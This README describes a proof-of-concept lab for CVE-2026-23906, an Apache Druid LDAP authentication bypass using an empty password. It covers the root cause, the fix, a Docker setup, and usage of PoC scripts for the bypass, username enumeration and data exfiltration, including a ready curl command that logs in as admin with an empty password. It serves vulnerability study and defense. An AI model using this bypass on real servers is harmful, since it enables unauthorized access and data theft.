# CVE-2026-23906 - Apache Druid LDAP Authentication Bypass via Empty Password

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-23906 |
| Component | [Apache Druid](https://druid.apache.org/) |
| Type | CWE-287: Improper Authentication |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.1% (22.6th percentile) |
| Affected | Apache Druid 0.17.0 through 35.x |
| Fix | Upgrade to Apache Druid 36.0.0 |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

CVE-2026-23906 is a critical authentication bypass in Apache Druid's `druid-basic-security` extension when configured with LDAP authentication. An unauthenticated attacker can gain full access to any LDAP-authenticated user account by providing a valid username with an **empty password**.

The vulnerability exploits the LDAP protocol's anonymous bind semantics (RFC 4513 §5.1.2) — when the underlying LDAP server permits anonymous binds (a common default), Druid incorrectly accepts the successful bind as valid authentication.

**Prerequisites for exploitation:**
1. `druid-basic-security` extension loaded with LDAP authenticator configured
2. Underlying LDAP server permits anonymous binds (default in OpenLDAP and many others)
3. Attacker knows a valid LDAP username

### Attack Chain

```
1. Send HTTP request with Basic Auth: valid username + empty password
2. Druid performs LDAP bind with the user's DN and empty password
3. LDAP server treats empty password as anonymous bind → returns success
4. Druid interprets successful bind as valid authentication → full access
```

### Root Cause

The `LDAPCredentialsValidator.validateCredentials()` method does not validate that `username` and `password` are non-empty before performing LDAP operations:

```
HTTP Request: "Authorization: Basic YWRtaW46"  (base64 of "admin:")
  → BasicHTTPAuthenticator.doFilter()
    → BasicAuthUtils.decodeUserSecret()          → user="admin", password=""
    → LDAPCredentialsValidator.validateCredentials()
      → getLdapUserObject()                       → finds "admin" user DN
      → validatePassword(userDn, char[0])         → LDAP bind with empty password
        → SECURITY_CREDENTIALS = ""               → ANONYMOUS BIND → SUCCESS
      → return AuthenticationResult("admin", ...)  → AUTHENTICATED!
```

### Fix

**Fixed in:** Apache Druid 36.0.0 — [Commit `79f149d8`](https://github.com/apache/druid/commit/79f149d8991802c7f005c2fea0b1d3586780750c) ([PR #18959](https://github.com/apache/druid/pull/18959))

```java
// LDAPCredentialsValidator.java, line 156
if (username.isEmpty() || password.length == 0) {
    return null;
}
```

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    Docker Compose Lab                        │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                  │
│  │ OpenLDAP │  │PostgreSQL│  │ZooKeeper │                   │
│  │  :389    │  │  :5432   │  │  :2181   │                   │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘                  │
│       │              │             │                         │
│  ┌────┴──────────────┴─────────────┴────┐                   │
│  │          Apache Druid 35.0.0         │                   │
│  │  Coordinator · Broker · Historical   │                   │
│  │  MiddleManager · Router (:8888)      │                   │
│  └──────────────────────────────────────┘                   │
│                     │                                        │
└─────────────────────┼────────────────────────────────────────┘
                      │ port 8888
                 ┌────┴────┐
                 │ Attacker│
                 └─────────┘
```

### Quick Start

```bash
cd CVE-2026-23906

# Build and start (8 containers — allow ~60s for Druid to initialize)
docker compose build
docker compose up -d

# Verify readiness
curl -u admin:priest http://localhost:8888/status

# Run the exploit
python3 poc.py localhost 8888 admin priest

# Cleanup
docker compose down -v
```

### Container Details

| Container | Image | Role | Host Port |
|---|---|---|---|
| `cve-2026-23906-router` | `apache/druid:35.0.0` | **Druid Router (attack surface)** | `8888` |
| `cve-2026-23906-coordinator` | `apache/druid:35.0.0` | Druid Coordinator + Overlord | — |
| `cve-2026-23906-broker` | `apache/druid:35.0.0` | Druid Broker | — |
| `cve-2026-23906-historical` | `apache/druid:35.0.0` | Druid Historical | — |
| `cve-2026-23906-middlemanager` | `apache/druid:35.0.0` | Druid MiddleManager | — |
| `cve-2026-23906-openldap` | Custom (osixia/openldap:1.4.0) | OpenLDAP with anonymous bind | — |
| `cve-2026-23906-postgres` | `postgres:16` | Druid metadata storage | — |
| `cve-2026-23906-zookeeper` | `zookeeper:3.5.10` | Druid coordination | — |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| LDAP / Druid | `admin` | `priest` |
| LDAP / Druid | `druid_system` | `warlock` |

## PoC Usage

All PoC scripts use **only Python 3 standard library** (no external dependencies).

### Quick Exploit (curl)

```bash
# Authenticate as admin with empty password
curl -u "admin:" http://localhost:8888/status
# Returns: {"version":"35.0.0","modules":[...]} — 200 OK
```

### Vector 1: Primary Auth Bypass (`poc.py`)

Full demonstration of authentication bypass with data exfiltration and cluster reconnaissance.

```bash
python3 poc.py localhost 8888 admin priest
```

**What it does:**
1. Verifies the target requires authentication (401 without credentials)
2. Confirms valid credentials work (200 with correct password)
3. Confirms wrong password is rejected (401)
4. **Exploits CVE-2026-23906** — authenticates with empty password (200)
5. Demonstrates data exfiltration via SQL endpoint
6. Demonstrates cluster reconnaissance via `sys.servers`

### Vector 2: Username Enumeration (`poc_vector2_user_enum.py`)

Enumerates valid LDAP usernames using the empty-password response as an oracle: valid users return 200, invalid users return 401.

```bash
python3 poc_vector2_user_enum.py localhost 8888
```

### Vector 3: Post-Exploitation Data Exfiltration (`poc_vector3_data_exfil.py`)

Demonstrates full post-exploitation capabilities after auth bypass: SQL data exfiltration, cluster worker enumeration, and configuration property disclosure.

```bash
python3 poc_vector3_data_exfil.py localhost 8888
```

### Vector 4: Raw HTTP Socket Exploit (`poc_vector4_raw_http.py`)

Zero-dependency exploit using raw TCP sockets — demonstrates the attack at the protocol level.

```bash
python3 poc_vector4_raw_http.py localhost 8888
```

## Verification: Vulnerable vs Patched

| Test Case | Vulnerable (Druid ≤35.x) | Patched (Druid 36.0.0) |
|---|---|---|
| No authentication | `401 Unauthorized` | `401 Unauthorized` |
| Valid credentials (`admin:priest`) | `200 OK` | `200 OK` |
| Wrong password (`admin:wrongpw`) | `401 Unauthorized` | `401 Unauthorized` |
| **Empty password** (`admin:`) | **`200 OK` — BYPASS** | `401 Unauthorized` |

## Files

| File | Description |
|---|---|
| `poc.py` | Primary auth bypass with data exfiltration and recon |
| `poc_vector2_user_enum.py` | LDAP username enumeration via response oracle |
| `poc_vector3_data_exfil.py` | Post-exploitation: SQL exfil, user/role/worker enum |
| `poc_vector4_raw_http.py` | Raw TCP socket exploit (zero dependencies) |
| `Dockerfile.openldap` | Custom OpenLDAP image with anonymous bind support |
| `docker-compose.yml` | 8-container lab environment |
| `environment` | Druid LDAP configuration environment variables |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-23906)
- [Apache Advisory](https://lists.apache.org/thread/2x9rv3kv6t1p577lvq4z0rl0zlt9g4sr)
- [GitHub Advisory (GHSA-q672-hfc7-g833)](https://github.com/advisories/GHSA-q672-hfc7-g833)
- [Fix PR #18959](https://github.com/apache/druid/pull/18959)
- [Fix Commit](https://github.com/apache/druid/commit/79f149d8991802c7f005c2fea0b1d3586780750c)

## Timeline

| Date | Event |
|---|---|
| 2026-02-09 | Vulnerability disclosed on oss-security mailing list |
| 2026-02-10 | CVE-2026-23906 published |
| 2026-02-10 | Apache Druid 36.0.0 released with fix |
| 2026-02-28 | This PoC lab created and verified |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-23906 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
